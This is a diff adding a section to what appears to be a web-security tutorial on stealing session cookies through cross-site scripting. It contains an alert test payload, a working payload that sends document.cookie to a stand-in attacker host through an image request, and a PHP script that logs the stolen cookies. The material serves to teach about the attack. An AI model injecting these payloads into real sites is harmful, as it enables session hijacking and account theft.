@@ -103,3 +103,36 @@ Example: If an attacker manages to inject a malicious script in a forum post, ev
 JS can access cookies if they do not have the HttpOnly flag enabled
 
 In many cases, stealing a cookie means stealing a user session
+
+For example, you can display the current cookies using:
+
+```javascript
+<script>alert(document.cookie)</script>
+```
+
+![](<../../../../.gitbook/assets/image (5).png>)
+
+This code sends cookie content to an attacker-controlled site
+
+```javascript
+<script>
+var i = new Image();
+i.src="http://attacker.site/log.php?q="+document.cookie;
+</script>
+```
+
+The script generates an image object and prints its `src` to a script on the attacker's server
+
+The browser cannot tell in advance if the source is a real image, so it loads and executes the script, even without displaying any image which means the cookie is actually sent to the attacker.site
+
+```php
+<?php
+$filename="/tmp/log.txt";
+$fp=fopen($filename, 'a');
+$cookie=$_GET['q'];
+fwrite($fp, $cookie);
+fclose($fp);
+?>
+```
+
+The `log.php` script saves the cookie in a text file on the attacker.site
